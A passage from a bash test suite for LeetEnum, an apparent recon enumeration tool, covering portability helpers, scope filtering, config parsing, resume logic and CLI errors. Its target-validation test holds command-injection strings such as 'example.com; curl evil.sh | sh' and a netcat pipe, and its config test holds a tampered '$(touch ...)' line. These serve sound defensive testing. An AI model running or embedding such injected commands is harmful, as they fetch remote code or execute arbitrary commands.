#!/usr/bin/env bash
# tests/run.sh — test suite for LeetEnum.
#
# Three layers:
#   1. Static analysis (bash -n everywhere, shellcheck when available).
#   2. Unit tests over the pure functions in lib/, which is where the
#      portability and correctness bugs lived.
#   3. An end-to-end scan against stand-in binaries, covering the two failures
#      that made the original unreliable: scope leakage and broken resume.
#
# No network access and no real recon tools required. Run with:
#   tests/run.sh            everything
#   tests/run.sh unit       just the unit tests
set -uo pipefail

TESTS_DIR=$(cd -P "$(dirname "${BASH_SOURCE[0]}")" && pwd)
ROOT=$(cd -P "${TESTS_DIR}/.." && pwd)
TMP=$(mktemp -d "${TMPDIR:-/tmp}/leetenum-test.XXXXXX")
FAKE_BIN="${TMP}/bin"

PASS=0; FAIL=0
trap 'rm -rf "$TMP"' EXIT

ok()   { PASS=$(( PASS + 1 )); printf '  ok   %s\n' "$1"; }
bad()  { FAIL=$(( FAIL + 1 )); printf '  FAIL %s\n' "$1"; [ -n "${2:-}" ] && printf '         %s\n' "$2"; }
head_() { printf '\n== %s\n' "$1"; }

is()   { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1" "expected '$3', got '$2'"; fi; }
isnt() { if [ "$2" != "$3" ]; then ok "$1"; else bad "$1" "expected anything but '$3'"; fi; }
yes_() { if [ "$2" -eq 0 ] 2>/dev/null; then ok "$1"; else bad "$1" "exit status $2"; fi; }

# ---------------------------------------------------------------------------
# Stand-in toolchain
# ---------------------------------------------------------------------------
setup_fakes() {
    mkdir -p "$FAKE_BIN"
    local t
    for t in subfinder assetfinder amass puredns gotator httpx naabu \
             katana nuclei gowitness waybackurls massdns dnsx findomain curl gau tlsx dig; do
        ln -sf "${TESTS_DIR}/fixtures/fake-tool.sh" "${FAKE_BIN}/${t}"
    done
    chmod +x "${TESTS_DIR}/fixtures/fake-tool.sh"
}

# ---------------------------------------------------------------------------
# 1. Static analysis
# ---------------------------------------------------------------------------
test_static() {
    head_ "Static analysis"
    local f
    for f in "${ROOT}/leetenum.sh" "${ROOT}"/lib/*.sh "${ROOT}"/tests/*.sh \
             "${ROOT}"/tests/fixtures/*.sh; do
        [ -f "$f" ] || continue
        if bash -n "$f" 2>"${TMP}/syn.err"; then
            ok "parses: $(basename "$f")"
        else
            bad "parses: $(basename "$f")" "$(head -n 3 "${TMP}/syn.err")"
        fi
    done

    if command -v shellcheck >/dev/null 2>&1; then
        for f in "${ROOT}/leetenum.sh" "${ROOT}"/lib/*.sh; do
            if shellcheck -S warning -e SC1090,SC1091,SC2034 "$f" >"${TMP}/sc.out" 2>&1; then
                ok "shellcheck: $(basename "$f")"
            else
                bad "shellcheck: $(basename "$f")" "$(head -n 6 "${TMP}/sc.out")"
            fi
        done
    else
        printf '  skip shellcheck (not installed)\n'
    fi

    # The pipeline must never reach for eval or a raw non-POSIX binary again.
    # Comments are stripped first: several of them name the very constructs
    # being banned in order to explain why they are banned.
    strip_comments() {
        local f
        for f in "$@"; do
            sed -e 's/[[:space:]]*#.*$//' "$f" | sed "s|^|${f}: |"
        done
    }

    if strip_comments "${ROOT}/leetenum.sh" "${ROOT}"/lib/*.sh \
         | grep -nE '(^|[^_[:alnum:]])eval[[:space:]]' >"${TMP}/eval.out" 2>/dev/null; then
        bad "no eval in shipped code" "$(cat "${TMP}/eval.out")"
    else
        ok "no eval in shipped code"
    fi

    if strip_comments "${ROOT}/leetenum.sh" "${ROOT}"/lib/pipeline.sh "${ROOT}"/lib/ui.sh \
         | grep -nE '(^|[^_[:alnum:]-])(nproc|md5sum|free -|readlink -f)' \
         >"${TMP}/np.out" 2>/dev/null; then
        bad "no GNU-only binaries outside compat.sh" "$(cat "${TMP}/np.out")"
    else
        ok "no GNU-only binaries outside compat.sh"
    fi

    # /dev/shm and the hardware probes belong to compat.sh alone.
    if strip_comments "${ROOT}/leetenum.sh" "${ROOT}"/lib/pipeline.sh "${ROOT}"/lib/ui.sh \
         "${ROOT}"/lib/config.sh | grep -nE '/dev/shm' >"${TMP}/shm.out" 2>/dev/null; then
        bad "no direct /dev/shm use outside compat.sh" "$(cat "${TMP}/shm.out")"
    else
        ok "no direct /dev/shm use outside compat.sh"
    fi

    # LC_ALL overrides every other LC_* variable, so exporting it — or assigning it
    # as a standalone statement that persists in the shell — would undo the
    # byte-wise LC_COLLATE that lets sort, comm and join agree with each other and
    # with a master list written by an earlier run on another host.
    #
    # What is still allowed, and is required on the data path, is the *scoped*
    # prefix form `LC_ALL=C some-command`: that assignment lives only in the
    # environment of the one command and never reaches the shell. compat_bytes and
    # compat_sort are built on it, because the BSD userland aborts at the first
    # invalid UTF-8 byte under the UI's UTF-8 LC_CTYPE and silently truncates the
    # host list.
    #
    # The pattern therefore matches an export, or an LC_ALL= at the start of a
    # statement with nothing after it on the line — not `LC_ALL=C cmd ...`.
    if strip_comments "${ROOT}/leetenum.sh" "${ROOT}"/lib/*.sh \
         | grep -nE 'export[[:space:]]+LC_ALL|(^|[;&|][[:space:]]*)LC_ALL=[^[:space:]]*[[:space:]]*$' \
         >"${TMP}/lc.out" 2>/dev/null; then
        bad "nothing sets LC_ALL outside a scoped command prefix" "$(cat "${TMP}/lc.out")"
    else
        ok "nothing sets LC_ALL outside a scoped command prefix"
    fi

    # The converse: the data path must not be left locale-aware. Every stage that
    # rewrites third-party bytes goes through compat_bytes or compat_sort, so a bare
    # tr/sed/grep/comm in a pipeline in pipeline.sh is a regression — that is what
    # made the same engagement return a different host set on macOS than on Linux.
    if strip_comments "${ROOT}"/lib/pipeline.sh \
         | grep -nE '\|[[:space:]]*(tr|sed|grep|comm|awk|sort)[[:space:]]' \
         >"${TMP}/raw.out" 2>/dev/null; then
        bad "no locale-aware stage on the data path" "$(cat "${TMP}/raw.out")"
    else
        ok "no locale-aware stage on the data path"
    fi
}

# ---------------------------------------------------------------------------
# 2. Unit tests
# ---------------------------------------------------------------------------
load_libs() {
    # shellcheck source=/dev/null
    . "${ROOT}/lib/compat.sh"
    # shellcheck source=/dev/null
    . "${ROOT}/lib/ui.sh"
    # shellcheck source=/dev/null
    . "${ROOT}/lib/config.sh"
    # shellcheck source=/dev/null
    . "${ROOT}/lib/deps.sh"
    # shellcheck source=/dev/null
    . "${ROOT}/lib/pipeline.sh"
    # shellcheck source=/dev/null
    . "${ROOT}/lib/hardening.sh"
    compat_init
    ui_init
}

test_compat() {
    head_ "compat.sh"

    isnt "platform detected"     "$LS_OS"    "unknown"
    is   "arch is normalised"    "$(printf '%s' "$LS_ARCH" | grep -cE '^(amd64|arm64|arm|386)$')" "1"
    yes_ "RAM is an integer"     "$(printf '%s' "$LS_RAM_MB" | grep -qE '^[0-9]+$'; echo $?)"
    yes_ "cores is an integer"   "$(printf '%s' "$LS_CORES" | grep -qE '^[0-9]+$'; echo $?)"
    yes_ "at least one core"     "$([ "$LS_CORES" -ge 1 ]; echo $?)"

    # compat_count: the padding bug that broke every `-gt 0` comparison.
    printf 'a\nb\nc\n' > "${TMP}/three.txt"
    is "compat_count counts"          "$(compat_count "${TMP}/three.txt")" "3"
    is "compat_count missing file"    "$(compat_count "${TMP}/nope.txt")"  "0"
    : > "${TMP}/empty.txt"
    is "compat_count empty file"      "$(compat_count "${TMP}/empty.txt")" "0"
    yes_ "count is usable in a test"  "$([ "$(compat_count "${TMP}/three.txt")" -gt 0 ]; echo $?)"

    # compat_sort under set -u with an empty options array: the bash 3.2 trap.
    is "compat_sort works" "$(printf 'b\na\nb\n' | compat_sort -u | tr '\n' ' ')" "a b "

    # Scratch dir must exist and be writable, never a bare /dev/shm assumption.
    local sd; sd=$(compat_scratch_dir "unit_$$")
    yes_ "scratch dir is writable" "$([ -d "$sd" ] && [ -w "$sd" ]; echo $?)"
    rm -rf "$sd"

    yes_ "avail_mb is numeric" "$(printf '%s' "$(compat_avail_mb "$TMP")" | grep -qE '^[0-9]+$'; echo $?)"
    isnt "hash is non-empty"   "$(printf 'abc' | compat_hash)" ""
    is   "realpath resolves"   "$(compat_realpath "${TMP}/three.txt")" "$(cd "$TMP" && pwd -P)/three.txt"

    # Locale split: UTF-8 for character handling, C for collation. Matching the
    # literal name "C.UTF-8" missed glibc's "C.utf8" spelling and fell back to
    # plain C, which downgraded the UI on hosts that handle UTF-8 fine.
    is "LC_ALL is not set"      "${LC_ALL:-unset}" "unset"
    is "collation is byte-wise" "$LC_COLLATE"      "C"
    # Any stderr from the probes means one of them misfired, which is how the
    # `tr -d '-_'` option-parsing bug hid: every locale name normalised to empty
    # and the fallback looked like a correct decision.
    ( compat_init ) 2>"${TMP}/probe.err" >/dev/null
    if [ -s "${TMP}/probe.err" ]; then
        bad "platform probes are silent" "$(head -n 2 "${TMP}/probe.err")"
    else
        ok "platform probes are silent"
    fi
    if locale -a 2>/dev/null | tr -d '_-' | tr '[:upper:]' '[:lower:]' | grep -q 'utf8'; then
        yes_ "UTF-8 ctype chosen when available" \
            "$(printf '%s' "$LC_CTYPE" | grep -qiE 'utf-?8'; echo $?)"
        is "charmap agrees" "$(locale charmap 2>/dev/null)" "UTF-8"
    else
        is "falls back to C ctype" "$LC_CTYPE" "C"
    fi

    # compat_timeout. `timeout` is GNU-only and absent on macOS, where every
    # bounded phase used to die with "command not found" and produce nothing.
    # Both paths are exercised: the real binary if this host has one, and the
    # pure-shell watchdog with LS_TIMEOUT_BIN forced empty.
    local bin_saved="${LS_TIMEOUT_BIN:-}" t0 t1
    local mode
    for mode in shell binary; do
        if [ "$mode" = "shell" ]; then
            LS_TIMEOUT_BIN=""
        else
            LS_TIMEOUT_BIN="$bin_saved"
            [ -n "$LS_TIMEOUT_BIN" ] || continue
        fi
        yes_ "timeout(${mode}): success passes through" \
            "$(compat_timeout 20 true; echo $?)"
        is "timeout(${mode}): exit code passes through" \
            "$(compat_timeout 20 sh -c 'exit 3' >/dev/null 2>&1; printf '%s' $?)" "3"
        is "timeout(${mode}): budget reports 124" \
            "$(compat_timeout 1 sleep 20 >/dev/null 2>&1; printf '%s' $?)" "124"
        # The point of a budget is that it returns near the deadline, not after
        # the command would have finished on its own.
        t0=$(date +%s); compat_timeout 1 sleep 20 >/dev/null 2>&1 || true; t1=$(date +%s)
        yes_ "timeout(${mode}): stops at the deadline" "$([ $(( t1 - t0 )) -lt 10 ]; echo $?)"
        is "timeout(${mode}): stdin reaches the command" \
            "$(printf 'piped\n' | compat_timeout 20 cat)" "piped"
    done
    LS_TIMEOUT_BIN=""

    # The assertion above is necessary but not sufficient, and for a long time it
    # was the only one — so it passed while phase 8 produced nothing at all on
    # every stock macOS host. Called directly, bash leaves the pipeline's stdin
    # attached; called through the nested `bash -c` that ui_run_sh actually uses,
    # the async command inside compat_timeout gets /dev/null instead. Only the
    # second shape reproduces the bug, so the regression test has to use it.
    #
    # This is the real phase 8 invocation:
    #   printf "%s\n" "$PIPE_TARGET" | compat_timeout 600 waybackurls > ...
    is "timeout(shell): stdin survives ui_run_sh's child bash" \
        "$(bash -c 'printf "%s\n" "example.com" | compat_timeout 20 cat 2>/dev/null; exit 0')" \
        "example.com"

    # A tool that ignores TERM still has to stop: the watchdog escalates to KILL.
    is "timeout(shell): TERM-ignoring tool is killed" \
        "$(compat_timeout 1 bash -c 'trap "" TERM; sleep 30' >/dev/null 2>&1; printf '%s' $?)" "124"
    # ui_run_sh evaluates snippets in a child bash, so the shim has to be
    # exported — the five bounded phases all call it from inside one.
    is "timeout is visible in a child bash" \
        "$(bash -c 'compat_timeout 20 printf ok' 2>/dev/null)" "ok"
    LS_TIMEOUT_BIN="$bin_saved"
}

test_target_validation() {
    head_ "Target validation"

    is "strips scheme"       "$(pipe_normalise_target 'https://example.com')"       "example.com"
    is "strips path"         "$(pipe_normalise_target 'https://example.com/a/b')"   "example.com"
    is "strips query"        "$(pipe_normalise_target 'example.com?x=1')"           "example.com"
    is "strips port"         "$(pipe_normalise_target 'example.com:8443')"          "example.com"
    is "strips www"          "$(pipe_normalise_target 'www.example.com')"           "example.com"
    is "lowercases"          "$(pipe_normalise_target 'EXAMPLE.COM')"               "example.com"
    is "strips trailing dot" "$(pipe_normalise_target 'example.com.')"              "example.com"
    is "keeps subdomains"    "$(pipe_normalise_target 'api.dev.example.co.uk')"     "api.dev.example.co.uk"

    # Command injection: these are the strings that reached `eval` in v1.
    local bad_input
    for bad_input in 'example.com; curl evil.sh | sh' '$(whoami).com' 'a b.com' \
                     '`id`.com' 'example.com|nc 1.2.3.4 9' '-rf' '' '..' \
                     'example' 'exa mple.com' 'example.com&&id'; do
        if pipe_normalise_target "$bad_input" >/dev/null 2>&1; then
            bad "rejects hostile target: ${bad_input}" "was accepted"
        else
            ok "rejects hostile target: ${bad_input:-<empty>}"
        fi
    done
}

test_scope_filter() {
    head_ "Scope filtering"

    # The v1 filter used an unanchored `grep "$TARGET"`, so all three of the
    # first entries below were reported as in-scope results for example.com.
    printf '%s\n' \
        'notexample.com.attacker.net' \
        'example.com.evil.io' \
        'myexample.com' \
        'www.example.com' \
        'api.example.com' \
        'example.com' \
        'EXAMPLE.COM' \
        > "${TMP}/scope_in.txt"

    local got
    got=$(pipe_filter_scope example.com < "${TMP}/scope_in.txt" | tr '\n' ' ')
    is "keeps only in-scope names" "$got" "www.example.com api.example.com example.com EXAMPLE.COM "

    # A dot in the target must not act as a regex wildcard.
    printf 'exampleXcom\nexample.com\n' > "${TMP}/scope2.txt"
    got=$(pipe_filter_scope example.com < "${TMP}/scope2.txt" | tr '\n' ' ')
    is "dot is literal, not any-char" "$got" "example.com "
}

test_profiles() {
    head_ "Performance profiles"

    local saved_ram="$LS_RAM_MB" saved_cores="$LS_CORES"

    # A 512 MB / 1 core VPS. v1 computed `free -g` = 0 here and then aborted on
    # an integer comparison; the floor must be the lite profile, not a crash.
    LS_RAM_MB=512; LS_CORES=1
    pipe_select_profile auto
    is "512MB/1core selects lite" "$PROFILE" "lite"
    yes_ "fanout at least 1"      "$([ "$FANOUT" -ge 1 ]; echo $?)"
    yes_ "per-worker rate sane"   "$([ "$DNS_RATE_PER_WORKER" -ge 50 ]; echo $?)"

    LS_RAM_MB=8192; LS_CORES=4
    pipe_select_profile auto
    is "8GB/4core selects balanced" "$PROFILE" "balanced"

    LS_RAM_MB=65536; LS_CORES=16
    pipe_select_profile auto
    is "64GB/16core selects beast" "$PROFILE" "beast"

    # High RAM but few cores must not pick beast: the DNS rate would swamp a
    # 2-core box even though it has memory to spare.
    LS_RAM_MB=65536; LS_CORES=2
    pipe_select_profile auto
    isnt "64GB/2core is not beast" "$PROFILE" "beast"

    pipe_select_profile lite
    is "explicit profile wins" "$PROFILE" "lite"

    # Total DNS traffic must stay at the profile's budget regardless of fanout.
    LS_RAM_MB=65536; LS_CORES=16
    pipe_select_profile beast
    yes_ "aggregate DNS rate is bounded" \
        "$([ $(( DNS_RATE_PER_WORKER * FANOUT )) -le $(( DNS_RATE + FANOUT )) ]; echo $?)"

    LS_RAM_MB="$saved_ram"; LS_CORES="$saved_cores"
}

test_ui() {
    head_ "UI layer"

    # Multi-byte repetition: `tr` works on bytes and produced mojibake here,
    # which is why ui_repeat uses bash pattern substitution instead. Assert on
    # byte length, which is the same answer under every locale — a character
    # count would only agree with itself on hosts that have a UTF-8 locale.
    is "repeat ascii"         "$(ui_repeat '-' 5)"  "-----"
    is "repeat zero is empty" "$(ui_repeat 'x' 0)"  ""
    is "repeat multibyte"     "$(ui_repeat '─' 3)"  "───"
    local unit='─' rep
    rep=$(ui_repeat "$unit" 3)
    is "multibyte length is exact" "${#rep}" "$(( ${#unit} * 3 ))"
    is "locale gives byte-wise collation" "$LC_COLLATE" "C"

    is "duration seconds"   "$(ui_fmt_duration 45)"    "45s"
    is "duration minutes"   "$(ui_fmt_duration 125)"   "2m05s"
    is "duration hours"     "$(ui_fmt_duration 3725)"  "1h02m05s"
    is "duration garbage"   "$(ui_fmt_duration 'abc')" "0s"

    is "fit short label"    "$(ui_fit 'short' 20)"  "short"
    is "fit long label"     "$(ui_fit 'abcdefghijklmnop' 10)" "abcdefg..."

    # Expected strings are built from the active glyph set, so this test is
    # meaningful under both UTF-8 and LC_ALL=C.
    local f="$G_BAR_FULL" e="$G_BAR_EMPTY"
    is "bar at zero"    "$(ui_bar 0 100 10)"   "$(ui_repeat "$e" 10)   0%"
    is "bar at half"    "$(ui_bar 50 100 10)"  "$(ui_repeat "$f" 5)$(ui_repeat "$e" 5)  50%"
    is "bar at full"    "$(ui_bar 100 100 10)" "$(ui_repeat "$f" 10) 100%"
    is "bar overshoot"  "$(ui_bar 500 100 10)" "$(ui_repeat "$f" 10) 100%"
    is "bar zero total" "$(ui_bar 0 0 10)"     "$(ui_repeat "$e" 10)   0%"

    # json_escape is what stopped webhook alerts from 400-ing on quoted titles.
    is "json escape quotes"  "$(json_escape 'say "hi"')" '"say \"hi\""'
    is "json escape newline" "$(json_escape "$(printf 'a\nb')")" '"a\nb"'
}

test_config() {
    head_ "Config storage"

    local cdir="${TMP}/conf"
    (
        export LEETENUM_CONFIG_DIR="$cdir" LEETENUM_CACHE_DIR="${TMP}/cache"
        # shellcheck source=/dev/null
        . "${ROOT}/lib/compat.sh"; . "${ROOT}/lib/ui.sh"; . "${ROOT}/lib/config.sh"
        compat_init; ui_init
        config_init_dirs
        NOTIFY_SERVICE="discord"; DISCORD_WEBHOOK='https://x/y?a="b"'
        SLACK_WEBHOOK=""; TELEGRAM_TOKEN=""; TELEGRAM_CHATID=""
        config_save
        # Saving twice must not duplicate keys, which is what v1's append did.
        config_save
        NOTIFY_SERVICE=""; DISCORD_WEBHOOK=""
        config_load
        printf '%s\n%s\n%s\n' "$NOTIFY_SERVICE" "$DISCORD_WEBHOOK" \
            "$(grep -c '^NOTIFY_SERVICE=' "${LS_CONF_FILE}")"
    ) > "${TMP}/conf.out" 2>"${TMP}/conf.err"

    is "service round-trips"    "$(sed -n 1p "${TMP}/conf.out")" "discord"
    is "webhook round-trips"    "$(sed -n 2p "${TMP}/conf.out")" 'https://x/y?a="b"'
    is "no duplicate keys"      "$(sed -n 3p "${TMP}/conf.out")" "1"

    local mode
    mode=$(ls -l "${cdir}/leetenum.conf" 2>/dev/null | cut -c2-10)
    is "config is user-only"    "$mode" "rw-------"

    # A tampered config must not be able to execute code.
    printf 'NOTIFY_SERVICE="none"\nEVIL=$(touch %s/pwned)\n' "$TMP" > "${cdir}/leetenum.conf"
    (
        export LEETENUM_CONFIG_DIR="$cdir"
        # shellcheck source=/dev/null
        . "${ROOT}/lib/config.sh"; config_load
    ) >/dev/null 2>&1
    if [ -e "${TMP}/pwned" ]; then
        bad "config is parsed, not sourced" "arbitrary command executed"
    else
        ok "config is parsed, not sourced"
    fi
}

# ---------------------------------------------------------------------------
# 3. End-to-end
# ---------------------------------------------------------------------------
run_scan() {
    local outroot="$1"; shift
    PATH="${FAKE_BIN}:${PATH}" \
    LEETENUM_CONFIG_DIR="${TMP}/e2e-conf" \
    LEETENUM_CACHE_DIR="${TMP}/e2e-cache" \
    LEETENUM_WORDLIST="${TMP}/wordlist.txt" \
    NO_COLOR=1 \
        "${ROOT}/leetenum.sh" scan -d example.com -o "$outroot" -y "$@" \
        </dev/null >>"${TMP}/e2e.log" 2>&1
}

test_e2e() {
    head_ "End-to-end scan"

    printf 'www\napi\nmail\nadmin\ndev\n' > "${TMP}/wordlist.txt"
    mkdir -p "${TMP}/e2e-cache/wordlists"
    # Pre-seed the cache so no phase reaches for the network.
    printf '1.1.1.1\n8.8.8.8\n' > "${TMP}/e2e-cache/wordlists/resolvers.txt"
    printf 'test\nold\ndev\n'    > "${TMP}/e2e-cache/wordlists/permutations.txt"
    printf 'NOTIFY_SERVICE="none"\n' > /dev/null

    local out="${TMP}/e2e"
    mkdir -p "$out" "${TMP}/e2e-conf"
    printf 'NOTIFY_SERVICE="none"\n' > "${TMP}/e2e-conf/leetenum.conf"

    if run_scan "$out" --profile lite; then
        ok "scan exits zero"
    else
        bad "scan exits zero" "$(tail -n 20 "${TMP}/e2e.log")"
    fi

    local run
    run=$(find "${out}/recon_example.com" -maxdepth 1 -mindepth 1 -type d -name '20*' 2>/dev/null | sort -r | head -n 1)
    if [ -z "$run" ]; then
        bad "run directory created" "nothing under ${out}/recon_example.com"
        return 0
    fi
    ok "run directory created"

    # Every phase must leave a durable artifact, so a resume can rebuild state.
    local f
    for f in 01_passive.txt 02_brute.txt 03_recursive.txt 04_perms.txt \
             05_http.jsonl 05_live_urls.txt 06_ports.txt 07_urls.txt \
             07_crawled_hosts.txt master_dns.txt master_live_urls.txt; do
        if [ -f "${run}/${f}" ]; then ok "artifact: ${f}"; else bad "artifact: ${f}" "missing"; fi
    done
    for f in reports/summary.md reports/nuclei.txt; do
        if [ -f "${run}/${f}" ]; then ok "artifact: ${f}"; else bad "artifact: ${f}" "missing"; fi
    done

    yes_ "master_dns.txt is non-empty" "$([ -s "${run}/master_dns.txt" ]; echo $?)"
    yes_ "run marked complete"         "$([ -f "${run}/.state/complete" ]; echo $?)"
    yes_ "all nine checkpoints written" \
        "$([ "$(find "${run}/.state" -name 'p*.done' | wc -l | tr -d '[:space:]')" -eq 9 ]; echo $?)"

    # Scope containment across the whole pipeline, not just one filter call.
    if grep -qE '(attacker\.net|evil\.example|evil\.io)' "${run}/master_dns.txt"; then
        bad "no out-of-scope hosts in master" "$(grep -E '(attacker|evil)' "${run}/master_dns.txt" | head -3)"
    else
        ok "no out-of-scope hosts in master"
    fi
    if grep -vqE '(^|\.)example\.com$' "${run}/master_dns.txt"; then
        bad "every master entry is in scope" "$(grep -vE '(^|\.)example\.com$' "${run}/master_dns.txt" | head -3)"
    else
        ok "every master entry is in scope"
    fi

    E2E_RUN="$run"; E2E_OUT="$out"
}

# The regression that mattered most: v1 stored `known.txt` and `seeds.txt` only
# inside phases 3 and 4, so resuming a run whose phase-4 checkpoint existed
# skipped the code that built them and the final merge wrote an empty
# master_dns.txt. The run "succeeded" with zero results.
test_resume() {
    head_ "Resume correctness"
    [ -n "${E2E_RUN:-}" ] || { printf '  skip (no completed run)\n'; return 0; }

    local before after
    before=$(compat_count "${E2E_RUN}/master_dns.txt")
    cp "${E2E_RUN}/master_dns.txt" "${TMP}/master_before.txt"

    # Reopen the completed run and force the later phases to re-run from artifacts.
    rm -f "${E2E_RUN}/.state/complete"
    rm -f "${E2E_RUN}/.state/p5.done" "${E2E_RUN}/.state/p6.done" \
          "${E2E_RUN}/.state/p7.done" "${E2E_RUN}/.state/p8.done" \
          "${E2E_RUN}/.state/p9.done"

    if run_scan "$E2E_OUT" --profile lite; then
        ok "resumed scan exits zero"
    else
        bad "resumed scan exits zero" "$(tail -n 20 "${TMP}/e2e.log")"
    fi

    local resumed
    resumed=$(find "${E2E_OUT}/recon_example.com" -maxdepth 1 -mindepth 1 -type d -name '20*' | sort -r | head -n 1)
    is "resumed in place, no new directory" "$resumed" "$E2E_RUN"

    after=$(compat_count "${E2E_RUN}/master_dns.txt")
    yes_ "master survives resume (was ${before}, now ${after})" \
        "$([ "$after" -ge "$before" ] && [ "$after" -gt 0 ]; echo $?)"

    # Stronger than a count: the inputs are deterministic, so re-running the
    # back half of the pipeline must reproduce the master set exactly. A phase
    # whose artifact is derived from master rather than from its own tool output
    # shrinks it on every resume, which is how the crawl artifact regressed.
    local lost
    lost=$(comm -23 "${TMP}/master_before.txt" "${E2E_RUN}/master_dns.txt" | head -n 5)
    if [ -n "$lost" ]; then
        bad "resume loses no hosts" "dropped: $(printf '%s' "$lost" | tr '\n' ' ')"
    else
        ok "resume loses no hosts"
    fi

    yes_ "resumed run marked complete" "$([ -f "${E2E_RUN}/.state/complete" ]; echo $?)"
}

# --only must re-run exactly the phases named and leave the rest untouched.
test_only_skip() {
    head_ "Phase selection"
    [ -n "${E2E_RUN:-}" ] || { printf '  skip (no completed run)\n'; return 0; }

    local stamp_p1 stamp_p6
    stamp_p1=$(cat "${E2E_RUN}/.state/p1.done" 2>/dev/null || echo 0)
    stamp_p6=$(cat "${E2E_RUN}/.state/p6.done" 2>/dev/null || echo 0)
    rm -f "${E2E_RUN}/.state/complete"
    sleep 1

    run_scan "$E2E_OUT" --profile lite --only p6 || true

    is "untouched phase keeps its checkpoint" \
       "$(cat "${E2E_RUN}/.state/p1.done" 2>/dev/null || echo 0)" "$stamp_p1"
    isnt "selected phase re-ran" \
       "$(cat "${E2E_RUN}/.state/p6.done" 2>/dev/null || echo 0)" "$stamp_p6"
}

# A second run must start a new directory (because the first is complete) and
# diff against the first rather than against itself. v1 compared against a file
# inside the current run directory, so the diff was always empty.
test_differential() {
    head_ "Differential reporting"
    [ -n "${E2E_RUN:-}" ] || { printf '  skip (no completed run)\n'; return 0; }

    # Make sure the first run counts as finished so it is not resumed.
    date +%s > "${E2E_RUN}/.state/complete"
    # Plant a host in the first run's master that the second run cannot rediscover,
    # and remove one it will, so the diff has something to find in both directions.
    printf 'brand-new.example.com\n' >> "${E2E_RUN}/master_dns.txt"
    sleep 1

    run_scan "$E2E_OUT" --profile lite || true

    local newest
    newest=$(find "${E2E_OUT}/recon_example.com" -maxdepth 1 -mindepth 1 -type d -name '20*' \
             | sort -r | head -n 1)
    isnt "second run got its own directory" "$newest" "$E2E_RUN"
    yes_ "diff artifact written" "$([ -f "${newest}/reports/new_since_last_run.txt" ]; echo $?)"

    # The planted host exists only in the previous run, so it must NOT appear as
    # "new"; anything listed must genuinely be absent from the previous master.
    if [ -s "${newest}/reports/new_since_last_run.txt" ]; then
        if comm -12 <(sort -u "${newest}/reports/new_since_last_run.txt") \
                    <(sort -u "${E2E_RUN}/master_dns.txt") | grep -q .; then
            bad "diff excludes previously-known hosts" "overlap found"
        else
            ok "diff excludes previously-known hosts"
        fi
    else
        ok "diff excludes previously-known hosts (empty diff)"
    fi

    yes_ "latest pointer resolves" \
        "$([ -e "${E2E_OUT}/recon_example.com/latest" ] || [ -f "${E2E_OUT}/recon_example.com/latest.txt" ]; echo $?)"
}

# Output must stay greppable when piped, and carry no escape sequences. This is
# what makes cron and `tee` usable; v1 wrote raw ANSI into every log file.
test_non_tty() {
    head_ "Non-TTY output"
    [ -n "${E2E_RUN:-}" ] || { printf '  skip\n'; return 0; }

    local log="${E2E_RUN}/logs/leetenum.log"
    yes_ "log file written" "$([ -s "$log" ]; echo $?)"
    if grep -q $'\033' "$log" 2>/dev/null; then
        bad "log has no escape sequences" "ANSI found in ${log}"
    else
        ok "log has no escape sequences"
    fi
    if grep -q $'\033' "${TMP}/e2e.log" 2>/dev/null; then
        bad "piped stdout has no escape sequences" "ANSI found when piped"
    else
        ok "piped stdout has no escape sequences"
    fi
    yes_ "log has phase markers" "$(grep -q '^[0-9:]* === \[1/9\]' "$log"; echo $?)"
}

test_cli() {
    head_ "Command line"

    local rc
    run_cli() {
        NO_COLOR=1 LEETENUM_CONFIG_DIR="${TMP}/cli-conf" LEETENUM_CACHE_DIR="${TMP}/cli-cache" \
            "${ROOT}/leetenum.sh" "$@" </dev/null >"${TMP}/cli.out" 2>&1
    }

    run_cli --help;    is "--help exits 0"    "$?" "0"
    run_cli version;   is "version exits 0"   "$?" "0"
    yes_ "version prints platform" "$(grep -q 'linux\|darwin\|freebsd\|windows' "${TMP}/cli.out"; echo $?)"

    run_cli scan -d example.com --profle beast; rc=$?
    is "typo'd flag is rejected" "$rc" "2"
    yes_ "typo'd flag names itself" "$(grep -q 'unknown option --profle' "${TMP}/cli.out"; echo $?)"

    # The infinite loop: `exit` inside $(...) only killed the subshell, so a
    # value-less flag printed forever without consuming an argument.
    #
    # Bounded through compat_timeout rather than `timeout`, which macOS does not
    # ship — the suite runs on macos-14 and macos-13 in CI, where a bare call
    # returns 127 and fails an assertion that has nothing to do with the bug it
    # is guarding. A run that really does loop comes back 124 and still fails.
    if compat_timeout 10 env NO_COLOR=1 "${ROOT}/leetenum.sh" scan -d </dev/null >"${TMP}/cli.out" 2>&1; then
        bad "missing value is rejected" "exited 0"
    else
        rc=$?
        is "missing value is rejected, not looped" "$rc" "2"
        is "error printed exactly once" \
           "$(grep -c 'requires a value' "${TMP}/cli.out")" "1"
    fi

    run_cli scan -d example.com --only p99; is "bad phase id rejected" "$?" "2"
    run_cli scan -d example.com --interval nope; is "bad interval rejected" "$?" "2"
    run_cli scan -p turbo -d example.com; is "bad profile rejected" "$?" "2"
}

# ---------------------------------------------------------------------------
# Wordlists.
#
# The permutation list used to be fetched from a third party's default branch.
# That URL 404s now, and unlike the resolver list it had no fallback, so phase 4
# silently generated nothing on any host that had never cached a copy — precisely
# the quiet-skip failure this rebuild exists to remove. It is built into the
# source now, so what needs covering is the fallback, the override, and the fact
# that the shell and Go copies of the list have not drifted apart.
#
# The e2e suite cannot reach any of this: it pre-seeds permutations.txt so the
# scan does not depend on a download, which means it always takes the
# already-present branch.
# ---------------------------------------------------------------------------
test_wordlists() {
    head_ "wordlists"

    local wl="${TMP}/wl-cache" perms saved_cache
    perms="${wl}/wordlists/permutations.txt"
    mkdir -p "${wl}/wordlists"
    # Both remote assets are pre-seeded so _pipe_refresh_asset finds them fresh
    # and the test needs no network.
    printf 'www\n'     > "${wl}/wordlists/dns-brute.txt"
    printf '1.1.1.1\n' > "${wl}/wordlists/resolvers.txt"

    saved_cache="${LS_CACHE_DIR}"
    LS_CACHE_DIR="$wl"

    pipe_prepare_wordlists >/dev/null 2>&1
    yes_ "perms: built-in list written when absent" "$([ -s "$perms" ]; echo $?)"
    is   "perms: WL_PERM points at it" "$WL_PERM" "$perms"
    yes_ "perms: covers stage, tier and infrastructure words" \
        "$(grep -qx staging "$perms" && grep -qx api "$perms" \
           && grep -qx v2 "$perms" && grep -qx k8s "$perms"; echo $?)"
    is "perms: no duplicates" \
       "$(sort "$perms" | uniq -d | wc -l | tr -d '[:space:]')" "0"
    is "perms: no blank or CR-terminated lines" \
